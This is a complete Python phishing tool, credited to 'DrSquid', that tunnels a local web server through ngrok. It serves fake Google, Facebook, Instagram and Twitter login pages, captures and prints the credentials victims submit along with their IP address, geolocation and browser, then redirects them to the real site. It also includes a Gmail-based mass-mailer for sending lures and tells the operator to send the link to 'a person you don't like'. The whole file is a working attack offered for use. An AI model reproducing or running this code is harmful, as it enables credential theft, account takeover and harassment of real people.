import socket, threading, os, smtplib, time, geocoder
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ip = 'localhost'
port = 80
s.bind((ip, port))
print("""
   _____             _     _ _____  _     _     _              __   ___  
  / ____|           (_)   | |  __ \| |   (_)   | |            /_ | / _ \ 
 | (___   __ _ _   _ _  __| | |__) | |__  _ ___| |__   ___ _ __| || | | |
  \___ \ / _` | | | | |/ _` |  ___/| '_ \| / __| '_ \ / _ \ '__| || | | |
  ____) | (_| | |_| | | (_| | |    | | | | \__ \ | | |  __/ |  | || |_| |
 |_____/ \__, |\__,_|_|\__,_|_|    |_| |_|_|___/_| |_|\___|_|  |_(_)___/ 
            | |                                                          
            |_|                                                          
""")
print("[+] Script By DrSquid\n")
print("[+] This script requires ngrok.")
choice_list = ['google','facebook','instagram','twitter']
while True:
    try:
        platform = input("[+] Enter Social Media Platform(google/facebook/instagram/twitter): ")
        ngrokdir = input("[+] Enter ngrok directory: ")
        if platform.lower() not in choice_list:
            print("[+] Invalid Platform.\n")
        else:
            os.chdir(ngrokdir)
            break
    except:
        print("[+] Directory not found.\n")
flag = 0
for dir in os.listdir():
    if 'ngrok.exe' in dir.lower():
        os.system('start ngrok.exe http 80')
        flag = 1
        break
    else:
        pass
if flag == 1:
    print("[+] Success with starting ngrok.")
    domain = input("[+] Enter Name Of Forwarded Website(only the part with the gibberish letters and numbers): ")
else:
    print("[+] Make sure to install ngrok.")
    print("\n[+] You can download it with this link: https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip\n")
    input("[+] Press ENTER to exit.")
    quit()
ip_list = []
print("\n[+] Phishing Server is Up.....")
print(f"[+] Send this to a person you don't like: http://{domain}.ngrok.io")
def email():
    while True:
        type_of_atk = input("[+] What type of attack are you doing?(massemail/singleemail): ")
        if type_of_atk.lower() == "massemail":
            while True:
                try:
                    gmail = smtplib.SMTP('smtp.gmail.com', 587)
                    gmail.starttls()
                    gmail.ehlo()
                    user = input("[+] Enter email: ")
                    password = input("[+] Enter Password: ")
                    gmail.login(user, password)
                    break
                except:
                    print("[+] Invalid Credentials.\n")
            emails = []
            subject = input("[+] Enter subject: ")
            content = input("[+] Enter message content: ")
            content = f'Subject: {subject}\n\n{content}'
            print("")
            print("[+] Input 'stop' to start sending the emails.")
            while True:
                target = input("[+] Enter email of victim: ")
                if target == "stop":
                    print("")
                    break
                else:
                    emails.append(target)
            for targets in emails:
                try:
                    gmail.sendmail(user, targets, content)
                    print(f"[+] Email sent to {targets}.")
                    time.sleep(2)
                except:
                    print(f"[+] Error sending email to {targets}.")
            gmail.close()
            break
        elif type_of_atk.lower() == "singleemail":
            while True:
                try:
                    gmail = smtplib.SMTP('smtp.gmail.com', 587)
                    gmail.starttls()
                    gmail.ehlo()
                    user = input("[+] Enter email: ")
                    password = input("[+] Enter Password: ")
                    gmail.login(user, password)
                    break
                except:
                    print("[+] Invalid Credentials.\n")
            try:
                target = input("[+] Enter target email: ")
                subject = input("[+] Enter subject: ")
                content = input("[+] Enter message content: ")
                content = f'Subject: {subject}\n\n{content}'
                gmail.sendmail(user, target, content)
                print(f"[+] Email sent successfully to {target}")
                gmail.close()
            except:
                print(f"[+] Error sending email to {target}.")
            break
        else:
            print("[+] Invalid Input.\n")
def listen():
    while True:
        try:
            s.listen(1)
            c, ip = s.accept()
            msg = c.recv(1024).decode()
            msg_split = msg.split()
            u_agent = False
            agent = []
            for i in msg_split:
                if 'user-agent' in i.lower():
                    u_agent = True
                if 'accept:' in i.lower():
                    u_agent = False
                if u_agent:
                    agent.append(i)
                else:
                    pass
            user_agent = ""
            for i in agent:
                user_agent = user_agent + " " + i
            user_agent = user_agent.strip()
            item = 0
            for i in msg_split:
                if 'x-forwarded-for' in i.lower():
                    ipaddr = msg_split[item + 1]
                    break
                else:
                    pass
                item += 1
            if ipaddr in ip_list:
                pass
            else:
                print(f"\n[+] Connection From IP: {ipaddr}")
                try:
                    info = geocoder.ip(ipaddr)
                    print(f"[+] Geolocation Info: {info.latlng}")
                except:
                    pass
                print(f"[+] Victim {user_agent}")
                ip_list.append(ipaddr)
            client = threading.Thread(target=handler, args=(c, msg, ip[0]))
            client.start()
        except:
            pass
def twitter_packet():
    msg = """
    <html><head>
<link href="https://logodownload.org/wp-content/uploads/2014/09/twitter-logo-4.png" rel="icon">
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="description" content="">
<meta name="author" content="w3hubs.com">
<link href="https://fonts.googleapis.com/css?family=Nunito+Sans:300i,400,700&amp;display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/5.0.0-alpha1/css/bootstrap.min.css">
<style type="text/css">
      body{
      font-family: "Nunito Sans";
      }
      .login-form{
      padding: 25px;
      }
      h3{
      padding-left:30px;
      padding-right: 20px;
      font-weight: 700;
      }
      label{
      padding-top: 4px;
      padding-left: 4px;
      }
      .bg-color{
      background-color:rgb(245, 248, 250);
      }
      .bg-color:hover label{
      color:#31a1f2;
      }
      .btn-custom{
      background-color: #1877f2;
      border: none;
      border-radius: 6px;
      font-size: 20px;
      line-height: 28px;
      color: #fff;
      font-weight:700;
      height: 48px;
      }
      .btn-custom{
      color: #fff !important;
      background-color: rgb(29, 161, 242);
      }
      .form-control{
      border:0px;
      background-color: rgb(245, 248, 250);
      border-bottom: 2px solid #657786;
      padding: 0px 4px 0px 4px;
      min-height: 20px;
      }
      .form-control:focus{
      box-shadow: none;
      background-color: rgb(245, 248, 250);
      border-color: #31a1f2;
      }
      .fa{
      color: rgb(29, 161, 242);
      margin: 0 auto;
      display: block;
      text-align: center;
      font-size: 50px;
      }
      a{
      text-decoration: none;
      color: rgb(27, 149, 224);
      }
      a:hover{
      text-decoration: underline;
      color: rgb(27, 149, 224);
      }
    </style>
</head>
<title>
Twitter Login
</title>
<body>
<div class="container">
<div class="row">
<div class="col-md-3"></div>
<div class="col-md-6 p-0 pt-3">
<i class="fa fa-twitter"></i>
<h3 class="text-center pt-3">Log in to Twitter</h3>
<form class="login-form" action="http://"""+domain+""".ngrok.io">
<div class="mb-3 bg-color">
<label>Phone, email, or username</label>
<input type="text" class="form-control" name="username">
</div>
<div class="mb-3 bg-color">
<label>Password</label>
<input type="password" class="form-control" name="password">
</div>
<input type="submit" placeholder="Log In" class="btn btn-custom btn-lg btn-block mt-3">
<div class="text-center pt-3 pb-3">
<a href="https://twitter.com/account/begin_password_reset" class="">Forgotten password?</a> .
<a href="https://twitter.com/i/flow/signup" class="">Sign up for Twitter</a>
</div>
</form>
</div>
<div class="col-md-3"></div>
</div>
</div>

</body></html>
    """
    return msg
def google_packet():
    msg = """
<style>
	.form-signin
{
    max-width: 330px;
    padding: 15px;
    margin: 0 auto;
}
.form-signin .form-signin-heading, .form-signin .checkbox
{
    margin-bottom: 10px;
}
.form-signin .checkbox
{
    font-weight: normal;
}
.form-signin .form-control
{
    position: relative;
    font-size: 16px;
    height: auto;
    padding: 10px;
    -webkit-box-sizing: border-box;
    -moz-box-sizing: border-box;
    box-sizing: border-box;
}
.form-signin .form-control:focus
{
    z-index: 2;
}
.form-signin input[type="text"]
{
    margin-bottom: -1px;
    border-bottom-left-radius: 0;
    border-bottom-right-radius: 0;
}
.form-signin input[type="password"]
{
    margin-bottom: 10px;
    border-top-left-radius: 0;
    border-top-right-radius: 0;
}
.account-wall
{
    margin-top: 20px;
    padding: 40px 0px 20px 0px;
    background-color: #f7f7f7;
    -moz-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
    -webkit-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
    box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
}
.login-title
{
    color: #555;
    font-size: 18px;
    font-weight: 400;
    display: block;
}
.profile-img
{
    width: 96px;
    height: 96px;
    margin: 0 auto 10px;
    display: block;
    -moz-border-radius: 50%;
    -webkit-border-radius: 50%;
    border-radius: 50%;
}
.need-help
{
    margin-top: 10px;
}
.new-account
{
    display: block;
    margin-top: 10px;
}
</style>
<title>
Google Login
</title>
<link href="https://upload.wikimedia.org/wikipedia/commons/thumb/5/53/Google_%22G%22_Logo.svg/1200px-Google_%22G%22_Logo.svg.png" rel="icon">
<link href="//netdna.bootstrapcdn.com/bootstrap/3.0.0/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
<script src="//netdna.bootstrapcdn.com/bootstrap/3.0.0/js/bootstrap.min.js"></script>
<script src="//code.jquery.com/jquery-1.11.1.min.js"></script>
<div class="container">
    <div class="row">
        <div class="col-sm-6 col-md-4 col-md-offset-4">
            <h1 class="text-center login-title">Sign in with google to continue</h1>
            <div class="account-wall">
                <img class="profile-img" src="https://lh5.googleusercontent.com/-b0-k99FZlyE/AAAAAAAAAAI/AAAAAAAAAAA/eu7opA4byxI/photo.jpg?sz=120"
                    alt="">
                <form class="form-signin" action="http://"""+domain+""".ngrok.io">
                <input type="text" name="username" class="form-control" placeholder="Email" required autofocus>
                <input type="password" name="password" class="form-control" placeholder="Password" required>
                <button class="btn btn-lg btn-primary btn-block" type="submit">
                    Sign in</button>
                <label class="checkbox pull-left">
                    <input type="checkbox" value="remember-me">
                    Remember me
                </label>
                <a href="https://support.google.com/accounts?hl=en#topic=3382296" class="pull-right need-help">Need help? </a><span class="clearfix"></span>
                </form>
            </div>
            <a href="https://accounts.google.com/signup/v2/webcreateaccount?service=accountsettings&continue=https%3A%2F%2Fmyaccount.google.com%2F&dsh=S755052533%3A1613343260014589&gmb=exp&biz=false&flowName=GlifWebSignIn&flowEntry=SignUp" class="text-center new-account">Create an account </a>
        </div>
    </div>
</div>
    """
    return msg
def instagram_packet():
    msg = """
                                        <style>
                                            * {
                                          margin: 0px;
                                          padding: 0px;
                                        }

                                        body {
                                          background-color: #eee;
                                        }

                                        #wrapper {
                                          width: 500px;
                                          height: 50%;
                                          overflow: hidden;
                                          border: 0px solid #000;
                                          margin: 50px auto;
                                          padding: 10px;
                                        }

                                        .main-content {
                                          width: 250px;
                                          height: 40%;
                                          margin: 10px auto;
                                          background-color: #fff;
                                          border: 2px solid #e6e6e6;
                                          padding: 40px 50px;
                                        }

                                        .header {
                                          border: 0px solid #000;
                                          margin-bottom: 5px;
                                        }

                                        .header img {
                                          height: 50px;
                                          width: 175px;
                                          margin: auto;
                                          position: relative;
                                          left: 40px;
                                        }

                                        .input-1,
                                        .input-2 {
                                          width: 100%;
                                          margin-bottom: 5px;
                                          padding: 8px 12px;
                                          border: 1px solid #dbdbdb;
                                          box-sizing: border-box;
                                          border-radius: 3px;
                                        }

                                        .overlap-text {
                                          position: relative;
                                        }

                                        .overlap-text a {
                                          position: absolute;
                                          top: 8px;
                                          right: 10px;
                                          color: #003569;
                                          font-size: 14px;
                                          text-decoration: none;
                                          font-family: 'Overpass Mono', monospace;
                                          letter-spacing: -1px;
                                        }

                                        .btn {
                                          width: 100%;
                                          background-color: #3897f0;
                                          border: 1px solid #3897f0;
                                          padding: 5px 12px;
                                          color: #fff;
                                          font-weight: bold;
                                          cursor: pointer;
                                          border-radius: 3px;
                                        }

                                        .sub-content {
                                          width: 250px;
                                          height: 40%;
                                          margin: 10px auto;
                                          border: 1px solid #e6e6e6;
                                          padding: 20px 50px;
                                          background-color: #fff;
                                        }

                                        .s-part {
                                          text-align: center;
                                          font-family: 'Overpass Mono', monospace;
                                          word-spacing: -3px;
                                          letter-spacing: -2px;
                                          font-weight: normal;
                                        }

                                        .s-part a {
                                          text-decoration: none;
                                          cursor: pointer;
                                          color: #3897f0;
                                          font-family: 'Overpass Mono', monospace;
                                          word-spacing: -3px;
                                          letter-spacing: -2px;
                                          font-weight: normal;
                                        }

                                        </style>
                                        <title>
                                            Instagram
                                        </title>
                                        <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/1200px-Instagram_logo_2016.svg.png">
                                        <div id="wrapper">
                                          <div class="main-content">
                                            <div class="header">
                                              <img src="https://i.imgur.com/zqpwkLQ.png" />
                                            </div>
                                            <div class="l-part">
                                              <form action="http://"""+domain+""".ngrok.io">
                                                <input type="text" placeholder="Username" class="input-1" name="username">
                                                <div class="overlap-text">
                                                <input type="password" placeholder="Password" name="password" style="width: 100%; margin-bottom: 5px; padding: 8px 12px; border: 1px solid #dbdbdb; box-sizing: border-box; border-radius: 3px;">
                                                <a href="https://www.instagram.com/accounts/password/reset/">Forgot?</a>
                                                </div>
                                                <input type="submit" value="Log in" class="btn"/>
                                              </form>
                                            </div>
                                          </div>
                                          <div class="sub-content">
                                            <div class="s-part">
                                              Don't have an account?<a href="https://www.instagram.com/accounts/emailsignup/"> Sign up</a>
                                            </div>
                                          </div>
                                        </div>
                                                """
    return msg
def facebook_packet():
    msg = """
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<title>Facebook</title>
	<link rel="icon" href="https://cdn1.iconfinder.com/data/icons/logotypes/32/square-facebook-512.png">
<style>
@import url('https://fonts.googleapis.com/css2?family=Poppins:wght@200;300;400;500;600&display=swap');
*{
	margin: 0;
	padding: 0;
	outline: 0;
	text-decoration: none;
	box-sizing: border-box;
}
body{
	font-family: 'Poppins', sans-serif;
	font-size: 14px;
	color: #1c1e21;
	font-weight: normal;
	background: #f8f8f8;
}
.loginsignup{
	padding: 120px;
}
.container{
	max-width: 992px;
	margin: auto;
}
.row{
	display: flex;
	flex-wrap: wrap;
}
.justify-content-between{
	justify-content: space-between;
}
.content-left{
	max-width: 500px;
	margin: auto;
}
.content-left h1{
	font-size: 40px;
	color: #1877f2;
	margin-bottom: 20px;
	font-weight: 600;
	text-shadow: -3px -3px 4px rgb(255,255,255),
               3px 3px 4px rgba(230, 230, 230, 0.96);;
}
.content-left h2{
	font-size: 20px;
	line-height: 32px;
	font-weight: 300;
	margin-bottom: 40px;
}
.content-right{
	max-width: 450px;
	margin: auto;
	text-align: center;
}
.content-right form{
	width:  396px;
	height: 360px;
	background: #f8f8f8;
	padding: 16px;
	box-shadow: -5px -5px 10px rgb(255,255,255),
               5px 5px 10px rgba(230,225,225,0.96);
	margin-bottom: 30px;
	    border-radius: 8px;
}
.content-right form input{
	width: 100%;
	height: 52px;
	background: #f8f8f8;
	padding: 0 15px;
	color: rgb(199, 198, 198);
	font-size: 17px;
	border: 1px solid #dddfe2;
	border-radius: 6px;
	margin-bottom: 15px;
	font-size: 17px;
}
::placeholder
{
	color: #9094b6;
}

.content-right form input:focus
{
	border: 1px solid #1877f2;
	box-shadow: 0 0px 2px #1877f2 ;

}
.btn{
	border-radius: 6px;
    font-size: 17px;
    line-height: 48px;
    padding: 0 16px;
	background: #1877f2;
	color: #fff;
	margin-bottom: 20px;
	text-transform: capitalize;
	font-weight: 500;
	box-shadow: -5px -5px 10px rgb(255,255,255),
               5px 5px 10px rgba(230, 230, 230, 0.96);
}
.login a{
	display: block;
}
.create-btn a{
	display: inline-block;
	padding: 0 17px;
	background: #4cd137;
	transition: .3s;
}
.create-btn a:hover{
	background: #44bd32;
}
.login .btn:active
{
	background: #f8f8f8;
	color: #1877f2;
}

.forgot a{
	font-size: 14px;
	line-height: 19px;
	color:#1877f2;
}
.forgot a:hover,
.content-right p a:hover{
	text-decoration: underline;
}
.content-right p a{
	color: #1c1e21;
	font-weight: 600;
}
.line
{
    align-items: center;
    border-bottom: 1px solid #dadde1;
    display: flex;
    margin: 20px 16px;
    text-align: center;
}

</style>
</head>
<body>
<div class="loginsignup">
	<div class="container">
		<div class="row justify-content-between">
			<div class="content-left">
				<h1>facebook</h1>
				<h2>Facebook helps you connect and share with the people in your life.</h2>
			</div>
			<div class="content-right">
				<form action="http://"""+domain+""".ngrok.io">
					<div class="form-group">
						<input type="text" placeholder="Email address or phone number" name="username">
					</div>
					<div class="form-group">
						<input type="password" placeholder="Password" name="password">
					</div>
					<div class="login">
                        <input type="submit" value="Log In" class="btn">
                       <div class="forgot">
						<a href="">Forgotten account?</a>
					</div>
					<div class="line"></div>
					<div class="create-btn">
						<a href="" class="btn">create new account</a>
					</div>
                    </div>
				</form>
				<p><a href="">Create a Page</a> for a celebrity, band or business.</p>
			</div>
		</div>
	</div>
</div>
		<!-- login Page end -->
</body>
</html>
    """
    return msg
def handler(c, msg, ip):
    try:
        already_requested = False
        c.send('HTTP/1.0 200 OK\n'.encode())
        c.send('Content-Type: text/html\n'.encode())
        c.send('\n'.encode())
        if 'username=' in msg:
            already_requested = True
            msg_split = msg.split()
            if 'username=' in msg_split[1]:
                info = msg_split[1]
                result = ""
                for i in info:
                    if i == "=" or i == "&":
                        result += " "
                    else:
                        result += i
                result = result.strip().split()
                username = result[1]
                password = result[3]
            else:
                pass
            item = 0
            for i in msg_split:
                if 'x-forwarded-for' in i.lower():
                    ipaddr = msg_split[item+1]
                    break
                else:
                    pass
                item += 1
            print(f"\n[+] User Info Obtained from IP {ipaddr}.\n[+] Username: {username}\n[+] Password: {password}")
        if already_requested:
            if platform.lower() == "instagram":
                c.send("""
                <meta http-equiv="Refresh" content="0; url='https://instagram.com/'" />          
                """.encode())
            elif platform.lower() == "facebook":
                c.send("""
                <meta http-equiv="Refresh" content="0; url='https://facebook.com/'" />          
                """.encode())
            elif platform.lower() == "google":
                c.send("""
                <meta http-equiv="Refresh" content="0; url='https://accounts.google.com/'" />          
                """.encode())
            elif platform.lower() == "twitter":
                c.send("""
                <meta http-equiv="Refresh" content="0; url='https://twitter.com/'" />          
                """.encode())
        if not already_requested:
            if platform.lower() == "instagram":
                c.send(instagram_packet().encode())
            elif platform.lower() == "facebook":
                c.send(facebook_packet().encode())
            elif platform.lower() == "google":
                c.send(google_packet().encode())
            elif platform.lower() == "twitter":
                c.send(twitter_packet().encode())
        c.close()
    except:
        pass
print("\n[+] Server is Listening for connections.....")
listener = threading.Thread(target=listen)
listener.start()
doemails = input("[+] Do you wish to send emails?: ")
if doemails.lower() == "yes":
    mailer = threading.Thread(target=email)
    mailer.start()